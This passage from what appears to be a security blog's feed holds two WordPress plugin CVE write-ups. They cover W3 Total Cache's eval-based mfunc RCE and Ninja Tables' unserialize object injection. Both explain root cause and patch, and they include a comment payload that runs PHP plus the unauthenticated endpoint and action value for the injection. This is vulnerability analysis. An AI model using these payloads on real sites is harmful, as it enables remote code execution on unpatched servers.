(unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress loads wp-settings.php&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WP_CACHE = true → Load advanced-cache.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;advanced-cache.php runs Dispatcher&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;PgCache_ContentGrabber-&amp;gt;process()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Util_Bus::add_ob_callback(&amp;#39;pagecache&amp;#39;, &amp;#39;ob_callback&amp;#39;)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;WordPress renders full HTML into output buffer&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;ob_callback($buffer) triggered&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;_has_dynamic($buffer) ?&amp;#34;}&#xA;I --&amp;gt;|No| J[&amp;#34;Return buffer as-is → Serve cached page&amp;#34;]&#xA;I --&amp;gt;|Yes| K[&amp;#34;Save buffer to _shutdown_buffer&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;register_shutdown_function(shutdown)&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;After request completes → shutdown()&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;_parse_dynamic(_shutdown_buffer)&amp;#34;]&#xA;N --&amp;gt; O{&amp;#34;HTML contains &amp;lt;!-- mfunc ... --&amp;gt; ?&amp;#34;}&#xA;O --&amp;gt;|Yes| P[&amp;#34;_parse_dynamic_mfunc()&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Extract payload from comment and run eval()&amp;#34;]&#xA;O --&amp;gt;|Or mclude| R[&amp;#34;_parse_dynamic_mclude() (include type)&amp;#34;]&#xA;Q --&amp;gt; S[&amp;#34;Output replaced with execution result&amp;#34;]&#xA;R --&amp;gt; S&#xA;S --&amp;gt; T[&amp;#34;Page optionally compressed&amp;#34;]&#xA;T --&amp;gt; U[&amp;#34;echo back to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Install and activate the plugin.&lt;/li&gt;&#xA;&lt;li&gt;Enable Page Cache.&lt;/li&gt;&#xA;&lt;li&gt;Configure &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; in &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Comment on any post:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- mfuncvalue --&amp;gt;phpinfo();&amp;lt;!-- /mfuncvalue --&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#39; alt=&#34;Result&#34; height=&#34;1078&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;&#xA;The value of &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; may be exposed if you forget to enable Page Cache and use it in a place where an Unauthenticated User can see it.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; title=&#34;Used when Page Cache is forgotten to be enabled&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss Page Cache&lt;/h2&gt;&lt;p&gt;Used when Page Cache is forgotten to be enabled&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#39; alt=&#34;Miss Page Cache&#34; height=&#34;259&#34; width=&#34;427&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Used when Page Cache is forgotten to be enabled&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-9501 arises because W3 Total Cache executes PHP in “dynamic fragment caching” (&lt;code&gt;&amp;lt;!-- mfunc ... --&amp;gt;&lt;/code&gt;) via &lt;code&gt;eval()&lt;/code&gt; without any validation or sandboxing. This allows unauthenticated attackers to inject PHP code that runs during &lt;code&gt;shutdown()&lt;/code&gt;, after WordPress completes the main request, leading to Remote Code Execution (RCE). The risk is heightened because cache and output handling occur outside normal WordPress lifecycle, bypassing hooks, nonces, and access checks. Version 2.8.13 removes the &lt;code&gt;eval()&lt;/code&gt; call, fixing the vulnerability.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;eval()&lt;/code&gt; in production code almost always results in RCE if input is uncontrolled.&lt;/li&gt;&#xA;&lt;li&gt;The plugin processes dynamic content &lt;strong&gt;after the full WordPress lifecycle&lt;/strong&gt;, bypassing many core protections.&lt;/li&gt;&#xA;&lt;li&gt;W3TC Page Fragment Caching allows PHP execution from HTML comments; misconfiguration or missing validation enables attacks.&lt;/li&gt;&#xA;&lt;li&gt;RCE triggers in &lt;code&gt;register_shutdown_function()&lt;/code&gt;, executing at the end of the request, making detection harder.&lt;/li&gt;&#xA;&lt;li&gt;Immediate plugin update is mandatory for systems using &amp;lt;= 2.8.12.&lt;/li&gt;&#xA;&lt;li&gt;Avoid &lt;code&gt;eval()&lt;/code&gt; in PHP unless strictly sandboxed and validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/command-injection.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Command Injection&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin &amp;lt; 2.8.13 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2939 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-21-cve-2025-2939/</link>
      <pubDate>Fri, 21 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-21-cve-2025-2939/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress plugin Ninja Tables – Easy Data Table Builder contains a &lt;strong&gt;PHP Object Injection&lt;/strong&gt; vulnerability in all versions up to 5.0.18, due to unsafe deserialization of user-provided data from the parameter &lt;code&gt;args[callback]&lt;/code&gt;. This allows an unauthenticated attacker to supply a malicious PHP object.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2939&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2939&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables – Easy Data Table Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Ninja Tables – Easy Data Table Builder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.18&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.19&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v5.0.18):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback = unserialize(base64_decode($params[&amp;#39;callback&amp;#39;]));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; function is executed directly on user input (&lt;code&gt;$params[&#39;callback&#39;]&lt;/code&gt; after base64 decoding). This introduces a severe vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection Risk&lt;/strong&gt;: If an attacker injects a serialized PHP object in base64 form, decoding and unserializing the data will instantiate the malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potential &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lack of Input Validation&lt;/strong&gt;: No validation of the data is performed before calling unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If the supplied data is invalid or malicious, no error-handling or safe alternative exists, increasing exploitability.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v5.0.19):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#34; title=&#34;Patch change&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch change&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#39; alt=&#34;Diff&#34; height=&#34;746&#34; width=&#34;1813&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch change&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; was replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Removing &lt;code&gt;unserialize()&lt;/code&gt; eliminates the possibility of &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;getCallback()&lt;/code&gt; is invoked inside the &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function registerAsyncRequestHandler()&#xA;{&#xA;    $action = static::makeAsyncRequestAction();&#xA;&#xA;    App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() {&#xA;        &#xA;        $request = App::make(&amp;#39;request&amp;#39;);&#xA;        &#xA;        $requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;        &#xA;        $requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&#xA;        &#xA;        $client = Client::make($requestUrl);&#xA;        &#xA;        $params = $request-&amp;gt;except(&#xA;            &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;        )[&amp;#39;args&amp;#39;];&#xA;&#xA;        $callback = static::getCallback($params);&#xA;        ...&#xA;    });&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function registers an Ajax endpoint for unauthenticated users (&lt;code&gt;admin_post_nopriv_&lt;/code&gt;) and retrieves the &lt;code&gt;action&lt;/code&gt; value using &lt;code&gt;makeAsyncRequestAction()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected static function makeAsyncRequestAction()&#xA;{&#xA;    return &amp;#39;wpf-async-request-&amp;#39;.sha1(&#xA;        App::config()-&amp;gt;get(&amp;#39;app.slug&amp;#39;)&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This returns &lt;code&gt;&amp;quot;wpf-async-request-&amp;quot;&lt;/code&gt; concatenated with the SHA1 hash of the plugin slug. Since the plugin slug is &lt;code&gt;ninja-tables&lt;/code&gt;, the final value becomes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; contains all data within &lt;code&gt;args[...]&lt;/code&gt; from the request, after removing the control fields (&lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; When a request is sent to &lt;code&gt;/wp-admin/admin-post.php&lt;/code&gt; with &lt;code&gt;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;, then &lt;code&gt;getCallback($params)&lt;/code&gt; is executed.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=base64_payload&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Plugin handler calls getCallback($params)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Decode base64 and unserialize payload&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Malicious object instantiated → RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 